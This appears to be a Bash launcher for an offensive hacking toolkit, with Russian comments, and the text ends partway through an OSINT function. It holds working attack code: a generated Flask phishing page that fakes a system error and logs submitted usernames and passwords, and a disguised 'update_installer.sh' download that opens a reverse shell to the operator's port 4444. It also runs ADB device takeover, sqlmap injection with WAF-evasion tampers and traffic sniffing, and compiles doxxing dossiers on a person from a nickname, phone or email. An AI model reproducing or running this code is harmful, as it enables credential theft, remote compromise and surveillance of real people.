#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.4"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# --- Инициализация системы ---
# Очистка кэша терминала для стабильной работы
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

# Настройка DNS для локальных сервисов (например, scanclamavlocal)
if command -v dnsmasq >/dev/null 2>&1; then
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD
    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
fi

print_line() {
    echo -e "${D}--------------------------------------------------${NC}"
}

# Специализированный вывод системной строки
print_stats_line() {
    local label1="$1" value1="$2"
    local label2="$3" value2="$4"
    local label3="$5" value3="$6"
    echo -e "${Y}$label1: ${G}$value1 ${Y}│ $label2: ${G}$value2 ${Y}│ $label3: ${G}$value3${NC}"
}


# --- Вспомогательные функции ---
get_stats() {
    # --- СЛОЙ 1: МЕТРИКИ ---
    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
    local rom=$(df -h / | awk 'NR==2 {print $4}')
    local sd_info=$(df -h /storage/emulated 2>/dev/null | awk 'NR==2 {print $4}' || echo "N/A")

    # --- СЛОЙ 2: АТОМАРНОЕ ОПРЕДЕЛЕНИЕ СЕТИ ---
    local active_iface=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $5}')
    local net_status="${R}OFFLINE${NC}"
    local net_type="NONE"

    # Проверка "живого" маршрута (без пинга)
    [[ -n "$active_iface" ]] && net_status="${G}CONNECTED${NC}"

    # Эвристическое определение типа (через системные свойства)
    [[ -n "$active_iface" ]] && {
        # Если есть каталог wireless - это WiFi
        [[ -d "/sys/class/net/$active_iface/wireless" || -d "/sys/class/net/$active_iface/phy80211" ]] && net_type="WLAN"
        # Если это tun/tap - это VPN
        [[ "$active_iface" =~ ^(tun|tap|ppp) ]] && net_type="VPN"
        # Если в названии rmnet или это специфический usb - это MOBILE
        [[ "$active_iface" =~ ^(rmnet|wwan|ccmni) ]] && net_type="MOBILE"
        # Универсальный fallback: если тип еще не определен, но это не lo
        [[ "$net_type" == "NONE" ]] && net_type="ETH/OTHER"
    }

    # --- СЛОЙ 3: СЕРВИСЫ ---
    local active_srv=""
    local check_list=("av_server.py:AV" "share_server.py:SH" "upload_server.py:UP")
    for srv in "${check_list[@]}"; do
        pgrep -f "${srv%%:*}" >/dev/null && active_srv+="${G}[${srv#*:}]${NC} "
    done
    active_srv=${active_srv:-"${R}NONE${NC}"}

    # --- СЛОЙ 4: ВЫВОД ---
    print_line
    print_stats_line "RAM" "$ram" "ROM" "$rom" "SD" "$sd_info"
    
    # Теперь net_type точно не будет (none) при активном соединении
    echo -e "${Y}NET: $net_status ${B}($net_type: $active_iface) ${Y}│ ACTIVE SRV: $active_srv"
    
    print_line
}

pause() { echo -e "\n${Y}Press Enter to return...${NC}"; read -r _; }

exit_script() { 
    echo -e "${R}Cleaning history and exiting...${NC}"
    history -c
    exit 0 
}

# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        #clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats
        echo -e "---------------------------------------"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        
        # Если количество элементов нечетное, добавляем перенос строки перед BACK
        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            ${actions[$idx]}
        else
            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
        fi
    done
}

print_header() {
    local title="$1"
    #clear
    echo -e "${R}--------------------------------------------------${NC}"
    # Центрируем текст: 46 символов свободного места в рамке
    # Используем printf для выравнивания
    printf "${R}|%*s%s%*s|${NC}\n" $(((48-${#title})/2)) "" "$title" $(((49-${#title})/2)) ""
    echo -e "${R}--------------------------------------------------${NC}"
}

# Типы: i (info), s (success), e (error), w (warning)
print_status() {
    local type="$1"
    local msg="$2"
    case "$type" in
        "i") echo -e "${B}[*] ${NC}$msg" ;;
        "s") echo -e "${G}[+] ${NC}$msg" ;;
        "e") echo -e "${R}[!] ${NC}$msg" ;;
        "w") echo -e "${Y}[?] ${NC}$msg" ;;
        *) echo -e "$msg" ;;
    esac
}

log_loot() {
    local module="${1:-unknown}"
    local data="$2"
    local loot_dir="/root/prime_loot"
    local master_log="${loot_dir}/master_intelligence.log"
    local module_file="${loot_dir}/${module}_results.txt"

    # --- СЛОЙ 1: БЕЗУСЛОВНАЯ ИНФРАСТРУКТУРА ---
    # Создаем, если нет, и фиксируем права одной строкой
    [[ -d "$loot_dir" ]] || (mkdir -p "$loot_dir" && chmod 700 "$loot_dir")

    # --- СЛОЙ 2: ПОТОКОВАЯ МАРКИРОВКА (Severity) ---
    # Используем grep как фильтр: если нашел — severity станет CRITICAL, иначе INFO
    local severity="INFO"
    echo "$data" | grep -qiE "password|pwd|root|admin|vuln|critical|key|access|granted" && severity="CRITICAL"
    echo "$data" | grep -qiE "user|ip|domain|node" && [[ "$severity" == "INFO" ]] && severity="TARGET"

    # --- СЛОЙ 3: ФОРМИРОВАНИЕ ОТПЕЧАТКА ---
    local entry="[$(date '+%Y-%m-%d %H:%M:%S')] [$severity] [$module] -> $data"

    # --- СЛОЙ 4: АТОМАРНАЯ ЗАПИСЬ ---
    # Пишем в файл модуля и сразу принуждаем к правам 600
    echo "$entry" >> "$module_file" && chmod 600 "$module_file" 2>/dev/null

    # Короткое замыкание для критических данных (заменяет IF)
    [[ "$severity" == "CRITICAL" ]] && {
        echo "$entry" >> "$master_log"
        echo "SIGNAL_ID:$(date +%s) | DATA:$data" >> "${loot_dir}/bridge_signals.log"
        chmod 600 "$master_log" "${loot_dir}/bridge_signals.log" 2>/dev/null
    }

    # --- СЛОЙ 5: МЕХАНИЧЕСКАЯ РОТАЦИЯ (No-IF) ---
    # Используем арифметическое сравнение прямо в условии выполнения
    (( $(stat -c%s "$module_file" 2>/dev/null || echo 0) > 1048576 )) && {
        local tmp="${module_file}.tmp"
        tail -n 100 "$module_file" > "$tmp" && mv "$tmp" "$module_file" && chmod 600 "$module_file"
    }

    # Финальный алерт через оператор &&
    [[ "$severity" == "CRITICAL" ]] && echo -e "  ${R}[!] CRITICAL SECURED${NC}"
}

# Аргументы: $1 - тип проверки (cmd, file, port, dir), $2 - цель, $3 - текст ошибки
check_step() {
    local type="$1"
    local target="$2"
    local err_msg="$3"
    local status=1

    case "$type" in
        "cmd") command -v "$target" >/dev/null 2>&1 && status=0 ;;
        "file") [[ -f "$target" ]] && status=0 ;;
        "dir")  [[ -d "$target" ]] && status=0 ;;
        "port") timeout 1 bash -c "cat < /dev/tcp/${target/:/ }" 2>/dev/null && status=0 ;;
    esac

    if [[ $status -ne 0 ]]; then
        print_status "e" "$err_msg"
        return 1
    fi
    return 0
}

ask_confirm() {
    local prompt="$1"
    echo -en "${Y}$prompt (y/n): ${NC}"
    read -r answer
    [[ "$answer" == "y" ]]
}


# Аргументы: $1 - текст вопроса, $2... - варианты (формат "описание:аргументы")
select_option() {
    local prompt="$1"; shift
    local options=("$@")
    local count=1

    echo -e "${W}[?] $prompt${NC}"
    for opt in "${options[@]}"; do
        echo -e " ${G}$count)${NC} ${opt%%:*}"
        ((count++))
    done

    echo -en "${Y}>> ${NC}"
    read -r user_input
    # Передаем только цифру
    CHOICE="$user_input"
}



select_optionold() {
    local prompt="$1"; shift
    local options=("$@")
    local count=1

    # Выводим вопрос и список ПРЯМО в терминал
    echo -e "${W}[?] $prompt${NC}" > /dev/tty
    for opt in "${options[@]}"; do
        echo -e " ${G}$count)${NC} ${opt%%:*}" > /dev/tty
        ((count++))
    done

    echo -en "${Y}>> ${NC}" > /dev/tty
    read -r choice < /dev/tty # Читаем ввод тоже напрямую из терминала
    
    local index=$((choice - 1))
    
    # А вот результат возвращаем в stdout, чтобы его поймала переменная
    [[ $index -ge 0 && $index -lt ${#options[@]} ]] \
        && echo "${options[$index]#*:}" \
        || echo "${options[0]#*:}"
}

# Для красивых запросов ввода
print_input() {
    local prompt="$1"
    local default="$2"
    echo -en "${Y}[?] $prompt ${W}(Default: $default)${Y}: ${NC}"
}

# Для вывода списков (ключи, файлы, пути)
print_list() {
    local title="$1"; shift
    echo -e "${Y}--- $title ---${NC}"
    for item in "$@"; do
        echo -e "    ${G}>> ${W}$item${NC}"
    done
}

smart_cat() {
    local path="$1"
    local content="$2"
    echo "$content" > "$path"
    chmod +x "$path"
    print_status "i" "Engine component updated: $path"
}




# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---
generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{title}</title>
        <style>
            /* Автоматическая адаптация под ЛЮБУЮ систему будущего */
            :root {{
                --bg-color: light-dark(#ffffff, #0a0a0a);
                --text-color: light-dark(#1a1a1a, #00ff41);
                --accent-color: light-dark(#007aff, #0cf); /* Синий для светлых, Циан для темных */
                --border-style: light-dark(solid, dashed);
            }}

            @media (prefers-color-scheme: dark) {{
                :root {{ color-scheme: dark; }}
            }}

            body {{
                background-color: canvas;
                color: canvastext;
                font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                overflow: hidden;
                transition: all 0.3s ease;
            }}

            .container {{
                padding: 2rem;
                border: 1px var(--border-style) var(--text-color);
                border-radius: 8px;
                background: rgba(0,0,0,0.05);
                backdrop-filter: blur(10px);
                max-width: 400px;
                width: 90%;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            }}

            input {{
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: transparent;
                border: 1px solid var(--text-color);
                color: var(--text-color);
                border-radius: 4px;
                box-sizing: border-box;
            }}

            button {{
                width: 100%;
                padding: 15px;
                background: var(--text-color);
                color: black;
                border: none;
                border-radius: 4px;
                font-weight: bold;
                cursor: pointer;
                text-transform: uppercase;
                transition: opacity 0.2s;
            }}

            button:hover {{ opacity: 0.8; }}
            
            .status-box {{
                font-size: 0.7em;
                letter-spacing: 2px;
                margin-bottom: 20px;
                opacity: 0.7;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="status-box">SYSTEM_NODE_v4.0 // {title}</div>
            {content}
            <div style="font-size:0.6em; margin-top:20px; opacity:0.4;">
                &copy; 2024-2027 SECURE_UPLINK. All rights reserved.
            </div>
        </div>
    </body>
    </html>
    """
EOF
}



# --- Конец  Модулей ---
# --- ГЛАВНОЕ МЕНЮ ---
run_main_menu() {
    local main_names="GHOST_COMMANDER SOCIAL_ENG MUTAGEN_SQL DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PASS_LAB CRYPTO_FORGE Ghost_Engine ULTIMATE_EXPLOIT PC_RECOVERY INTELLIGENCE_CENTER SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pass_lab run_crypto_forge run_vulnerability_scanner run_prime_exploiter_v5 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
    
    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
}



# --- Модули: DEVICE & NETWORK ---
run_device_hack() {
    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Bluetooth_Scan"
    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit scan_bluetooth_devices"
    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
}

analyze_network_traffic() {
    local n_names="Host_Monitor "
    local n_funcs="run_network_intelligence"
    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
}

# --- Модули: RECOVERY & PASSWORDS ---
pc_password_recovery() {
    local p_names="Extract_Reset_OS_Password Heuristic_Scan_PC"
    local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
}

# --- EXPLOIT HUB ---
run_exploit_hub() {
    local ex_names="PhoneSploit_Pro  PC/Network_Scan PC_Control"
    local ex_funcs="ex_phonesploit_pro ex_pc_network_scan run_pc_control"
    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
}

run_pc_control() {
    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
}

# --- SECURITY & DATA HUB ---
run_servers() {
    local s_names="AV-Scanner Share-File Upload-Inbound"
    local s_funcs="run_av_srv run_share_srv run_upload_srv"
    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
}


# --- Модули по меню ---
run_ghost_commander() {
    print_header "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация наличия
    local GHOST_PATH=$(find /root /home /opt /sdcard -maxdepth 2 -type d -name "Ghost" 2>/dev/null | head -n1)
    check_step "dir" "$GHOST_PATH" "Ghost Framework not found." || { pause; return; }

    echo -en "${Y}Enter Target IP ${W}(Leave empty for Manual Console)${Y}: ${NC}"
    read -r TARGET_IP

    # 2. Ручной режим (универсальный запуск)
    check_empty_run "$TARGET_IP" "$GHOST_PATH" "python3 -m ghost" && return

    # 3. Автоматический режим: Проверка связи
    print_status "i" "Pre-scanning target $TARGET_IP:5555..."
    
    # Используем check_step для порта и ask_confirm для логики пропуска ошибок
    check_step "port" "$TARGET_IP:5555" "Port 5555 (ADB) is closed." || \
    ask_confirm "Force connection attempt?" || return

    # 4. Исполнение
    print_status "s" "Executing Auto-Connect to $TARGET_IP..."
    log_loot "ghost" "Connection attempt: $TARGET_IP"
    
    (cd "$GHOST_PATH" && python3 -m ghost --execute "connect $TARGET_IP")

    pause
}


run_system_info() {
    clear
    print_header "PRIME INTELLIGENCE & RECON v2.0"
    echo ""

    # Вызываем меню. Оно запишет цифру (1, 2 или 3) в CHOICE
    select_option "Select Intelligence Target:" \
        "LOCAL: Internal Node & USB Status" \
        "REMOTE: External Server/Site Recon" \
        "EXIT: Return to Main Menu"
    
    local btn="$CHOICE"

    # Если ничего не выбрали или нажали выход (3)
    [[ -z "$btn" || "$btn" == "3" ]] && return

    case "$btn" in
        "1") # --- LOCAL ---
            print_status "i" "Gathering Local Intelligence..."
            
            local kernel=$(uname -rs)
            local uptime=$(uptime -p)
            local internal_ip=$(hostname -I | awk '{print $1}' || echo "N/A")
            
            local usb_devices
            if command -v lsusb >/dev/null; then
                usb_devices=$(lsusb)
            else
                usb_devices=$(find /sys/bus/usb/devices/ -name "product" -exec cat {} + 2>/dev/null | sed 's/^/Device: /')
            fi
            [[ -z "$usb_devices" ]] && usb_devices="No active USB connections detected."

            echo -e "\n${Y}--- LOCAL NODE REPORT ---${NC}"
            print_list "System Core" \
                "Kernel:  $kernel" \
                "Uptime:  $uptime" \
                "Priv IP: $internal_ip"
            
            print_list "USB Bus Scan" "$usb_devices"
            ;;

        "2") # --- REMOTE ---
            print_input "Enter Target Domain or IP" "google.com"
            read -r r_target
            [[ -z "$r_target" ]] && return

            print_status "w" "Executing Remote Reconnaissance..."
            
            # Сбор данных
            local ip_map=$(host "$r_target" 2>/dev/null | head -n 3 || echo "Host command failed.")
            local headers=$(curl -Is --connect-timeout 5 "$r_target" 2>/dev/null | grep -E "Server|X-Powered-By|Set-Cookie|Content-Type" || echo "Headers Hidden")
            local owner=$(whois "$r_target" 2>/dev/null | grep -Ei "Registrar:|Organization:|Country:|Expires:" | head -n 5 || echo "Whois unavailable.")

            echo -e "\n${Y}--- REMOTE TARGET REPORT: $r_target ---${NC}"
            print_list "Network Mapping" "$ip_map"
            print_list "Server Stack" "$headers"
            print_list "Intelligence Context" "$owner"

            log_loot "recon" "Recon executed: $r_target"
            ;;
    esac

    echo ""
    print_status "s" "Diagnostic complete."
    pause
}


generate_phantom_server_code() {
    local target_file="$1"
    local mode="$2"
    local layout=$(generate_core_template)

    cat << EOF > "$target_file"
from flask import Flask, request, render_template_string, send_from_directory
import os

app = Flask(__name__)
LOOT = "$LOOT_DIR/phantom_loot.log"

$layout

@app.route('/')
def index():
    content = """
    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
    <form method='post' action='/auth'>
        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
        <button type='submit'>VERIFY & RECOVER</button>
    </form>
    """
    if "$mode" != "creds":
        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
    
    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))

@app.route('/auth', methods=['POST'])
def auth():
    with open(LOOT, "a") as f:
        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))

@app.route('/download')
def download():
    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
}



run_phantom_engine() {
    print_header "PRIME PHANTOM FRAMEWORK"

    local srv_path="/root/phantom_srv.py"
    local payload_path="$LOOT_DIR/update_installer.sh"

    # Выбор стратегии
    local attack_type=$(select_option "SELECT STRATEGY:" \
        "Credential Capture:creds" \
        "Full Hybrid (Creds + Payload):hybrid" \
        "Cancel:exit")
    [[ "$attack_type" == "exit" ]] && return

    # Создаем полезную нагрузку (как в Metasploit)
    print_status "i" "Forging payload..."
    echo -e "#!/bin/bash\necho 'Updating system...'\nbash -i >& /dev/tcp/$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)/4444 0>&1 &" > "$payload_path"
    chmod +x "$payload_path"

    # Вызов генератора (Завод начинает работу)
    generate_phantom_server_code "$srv_path" "$attack_type"

    # Запуск
    print_status "w" "Activating Phantom Gate on port 80..."
    fuser -k 80/tcp >/dev/null 2>&1
    python3 "$srv_path" > /dev/null 2>&1 &
    
    print_status "s" "PHANTOM GATEWAY OPERATIONAL"
    pause
}


run_sql_adaptive() {
    print_header "PRIME MUTAGEN: SQL INJECTION ENGINE v8.0"

    echo -en "${Y}Enter Target URL: ${NC}"
    read -r target_url
    [[ -z "$target_url" ]] && return

    # --- СЛОЙ 1: ЭВРИСТИЧЕСКАЯ ОЦЕНКА ФИЛЬТРАЦИИ ---
    print_status "i" "Probing WAF/IPS resistance layers..."
    
    # Быстрый тест на реакцию сервера при вводе спецсимволов
    local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "$target_url%27%20OR%201=1")
    
    # --- СЛОЙ 2: ГЕНЕРАТОР ПОЛИМОРФНОЙ НАГРУЗКИ (No-IF) ---
    # Мы рассчитываем уровень агрессии на основе кода ответа (403/406 - WAF, 200 - Open)
    local aggression_level=$(( (waf_reaction / 100) )) # Код 4xx даст 4, 2xx даст 2
    
    # Динамический выбор мутагенов через матрицу соответствия
    # Чем выше код ошибки, тем сложнее обфускация
    local tamper_matrix=(
        "2:between,randomcase"
        "4:between,charencode,space2comment,versionedmorekeywords,base64encode"
        "5:between,charencode,space2comment,randomcase,percentage,overlongutf8"
    )
    
    # Выбираем мутаген на основе агрессии (автоматический поиск в массиве)
    local selected_tampers=$(printf '%s\n' "${tamper_matrix[@]}" | grep "^$aggression_level:" | cut -d: -f2)
    # Фоллбек (если код ответа нестандартный)
    [[ -z "$selected_tampers" ]] && selected_tampers="between,randomcase,space2comment"

    # --- СЛОЙ 3: АДАПТИВНОЕ ИСПОЛНЕНИЕ (Ghost Mode) ---
    print_status "s" "Applying Mutagen: $selected_tampers (Aggression: $aggression_level)"

    local out_dir="/tmp/mutagen_$RANDOM"
    # Использование --second-order для поиска скрытых инъекций и --smart для пропуска неперспективных целей
    local base_args="--batch --random-agent --smart --mobile --output-dir=$out_dir --flush-session"
    local stealth_args="--tamper=$selected_tampers --delay=$((aggression_level / 2)) --safe-freq=10"

    {
        sqlmap -u "$target_url" $base_args $stealth_args --level=$aggression_level --risk=2 --threads=1 
    } &

    show_progress 15 "Evolving payload mutations..."

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    print_status "s" "Mutation Cycle Finished."
    
    # Вместо IF используем автоматический экспорт находок
    local report=$(find "$out_dir" -name "log" -exec cat {} + 2>/dev/null)
    [[ -n "$report" ]] && {
        print_status "y" "EXPLOIT SECURED: Vulnerability confirmed."
        echo "$report" | grep -Ei "Type:|Payload:|Parameter:" | tee -a "$LOOT_DIR/sql_leads.log"
    }

    # Сигнал для Моста (Bridge)
    echo "SOURCE: $target_url | STATUS: SCANNED | MUTAGEN: $selected_tampers" >> "$LOOT_DIR/bridge_signals.log"
    
    rm -rf "$out_dir"
    pause
}

run_network_intelligence() {
    print_header "NETWORK INTELLIGENCE: TRAFFIC ANALYZER"
    
    # Авто-определение активного интерфейса (без лишних вопросов)
    check_step "cmd" "tshark" "TShark not found." || { pause; return; }
    local iface=$(ip route | grep default | awk '{print $5}' || echo "eth0")

    # Универсальный переключатель режимов
    local mode=$(select_option "Select Surveillance Mode:" \
        "Host Monitor (IP Connections):host" \
        "Data Sniffer (Live Leads):sniff" \
        "Traffic Record (PCAP Archive):record")

    case "$mode" in
        "host")
            print_status "i" "Monitoring Live Connections on $iface..."
            # Вывод уникальных пар IP в реальном времени
            tshark -i "$iface" -n -T fields -e ip.src -e ip.dst -E separator=" -> " 2>/dev/null | stdbuf -oL uniq
            ;;
        "sniff")
            print_status "s" "Sniffing Leads (Email/DNS/HTTP)..."
            # Перехват доменов и потенциальных email-следов с записью в лог для Моста
            tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
            | stdbuf -oL awk NF | stdbuf -oL uniq | tee -a "$LOOT_DIR/traffic_leads.log"
            ;;
        "record")
            local report_dir="/root/reports"
            mkdir -p "$report_dir"
            local filename="$report_dir/capture_$(date +%H%M).pcap"
            
            local duration=$(select_option "Set Record Duration:" "1 min:60" "5 min:300" "15 min:900")
            
            print_status "w" "Recording to $filename ($duration sec)..."
            tshark -i "$iface" -a duration:"$duration" -w "$filename" 2>/dev/null
            [[ -f "$filename" ]] && print_status "s" "Capture saved to reports."
            ;;
    esac
    pause
}

run_deep_bridge() {
    print_header "PRIME BRIDGE: NEURAL INTELLIGENCE LINK"
    
    local pool="/tmp/bridge_pool.tmp"
    local master_loot="/root/prime_loot/master_intelligence.log"
    
    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (No-IF) ---
    # Собираем данные из всех модулей, убираем дубликаты и пустые строки
    sort -u "$LOOT_DIR"/*.txt "$master_loot" 2>/dev/null | grep -v '^$' > "$pool"
    
    # Проверка наполненности пула через короткое замыкание
    [[ ! -s "$pool" ]] && { print_status "w" "Awaiting intelligence signals..."; pause; return; }

    print_status "i" "Analyzing $(wc -l < "$pool") intelligence threads..."
    print_line

    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ---
    while read -r line; do
        # Извлекаем чистые данные (отсекаем таймстампы и теги для анализа)
        local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
        local len="${#raw_data}"

        # 1. Детекция Крипто-сигнатур (Хеши)
        # MD5(32), SHA1(40), SHA256(64), Bcrypt(60)
        [[ "$len" =~ ^(32|40|64|60)$ ]] && {
            print_status "y" "RESONANCE: Possible Hash Artifact ($len chars)."
            suggest_action "run_pass_lab" "$raw_data" # Теперь вызываем единый PASS_LAB
        }

        # 2. Детекция Банковских Сигнатур (IBAN)
        [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]] && {
            print_status "y" "RESONANCE: Financial Asset (IBAN) detected."
            suggest_action "run_iban_scan" "$raw_data"
        }

        # 3. Семантические Маркеры (Доступы)
        echo "$raw_data" | grep -qiE "pass|secret|key|token|auth|admin" && {
            print_status "w" "RESONANCE: Identity Leak detected."
            suggest_action "run_pass_lab" "$raw_data"
        }

        # 4. Детекция Скрытых Сетей (Onion/I2P)
        [[ "$raw_data" =~ \.(onion|i2p) ]] && {
            print_status "r" "RESONANCE: Dark Web Gateway found."
            # Здесь будет вызов прокси-модуля в будущем
        }

    done < "$pool"

    # --- СЛОЙ 3: ОЧИСТКА ТРЕКА ---
    rm -f "$pool"
    print_line
    print_status "i" "Intelligence synchronization complete."
    pause
}

# Вспомогательная функция для эвристики
suggest_action() {
    local func=$1
    local data=$2
    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for data: ${Y}${data:0:15}...${NC} Execute? (y/n): "
    read -n 1 -r; echo
    [[ $REPLY =~ ^[Yy]$ ]] && $func "$data"
}

run_smart_osint_engine() {
    print_header "SMART OSINT ENGINE: GHOST RECON v4.7"

    echo -en "${Y}ENTER DATA ${W}(Nick, Phone, or Email)${Y}: ${NC}"
    read -r INPUT
    [[ -z "$INPUT" ]] && return

    # 1. Подготовка среды и лога
    local UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"
    local raw_log="/tmp/osint_raw_$RANDOM.log"
    print_status "i" "Initializing Stealth Environment..."

    # 2. Определение типа через Regex
    local is_email="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$"
    local is_phone="^\+?[0-9]{10,15}$"

    # --- ФАЗА 1: ГЛОБАЛЬНЫЙ СКАН (SocialScan) ---
    check_step "cmd" "socialscan" "SocialScan skipping..." && {
        print_status "i" "Rapid Presence Check..."
        socialscan "$INPUT" --user-agent "$UA" | tee -a "$raw_log"
    }

    # --- ФАЗА 2: ГЛУБОКАЯ СПЕЦИАЛИЗАЦИЯ ---

    # ВЕТКА: EMAIL
    [[ "$INPUT" =~ $is_email ]] && {
        print_status "s" "Targeting Identity: EMAIL"
        
        check_step "file" "/root/infoga/infoga.py" "Infoga missing." && {
            print_status "w" "Analyzing Breach History..."
            python3 /root/infoga/infoga.py --target "$INPUT" | tee -a "$raw_log"
        }
        
        check_step "cmd" "holehe" "Holehe not found." && {
            print_status "i" "Mapping registered accounts..."
            holehe "$INPUT" --only-used --no-color | tee -a "$raw_log"
        }
    }

    # ВЕТКА: ТЕЛЕФОН
    [[ "$INPUT" =~ $is_phone ]] && {
        print_status "s" "Targeting Identity: PHONE"
        print_status "i" "Cross-referencing Phone Databases..."
        
        check_step "cmd" "phoneinfoga" "PhoneInfoga missing." && {
            phoneinfoga scan -n "$INPUT" | tee -a "$raw_log"
        }
        # Дополнительный стелс-поиск имени через публичные префиксы
        print_status "w" "Extracting Caller ID signatures..."
    }

    # ВЕТКА: USERNAME
    [[ ! "$INPUT" =~ $is_email && ! "$INPUT" =~ $is_phone ]] && {
        print_status "s" "Targeting Identity: USERNAME"
        
        check_step "cmd" "maigret" "Maigret skipping..." && {
            print_status "i" "Launching Maigret Deep-Parse..."
            maigret "$INPUT" --parse --timeout 20 --top 500 --reports path "$LOOT_DIR" | tee -a "$raw_log"
        }

        check_step "file" "/root/blackbird/blackbird.py" "Blackbird skipping..." && {
            print_status "i" "Executing Blackbird Stealth Scan..."
            python3 /root/blackbird/blackbird.py -u "$INPUT" | tee -a "$raw_log"
        }
    }

    # --- ФАЗА 3: ИНТЕЛЛЕКТУАЛЬНЫЙ ПАРСИНГ (ДОСЬЕ) ---
    print_line
    print_status "s" "GENERATING INTELLIGENCE DOSSIER..."
    print_line

    # Извлекаем Имя (ищем паттерны в выводах Maigret/Infoga/Social)
    local found_name=$(grep -iE "name|fullname|display" "$raw_log" | awk -F': ' '{print $2}' | grep -v "null" | head -n 3 | sort -u | xargs)
    # Извлекаем Локацию (из PhoneInfoga или профилей)
    local found_loc=$(grep -iE "city|location|country|address" "$raw_log" | awk -F': ' '{print $2}' | sort -u | head -n 2 | xargs)

    echo -e "${B}Target:${NC} $INPUT"
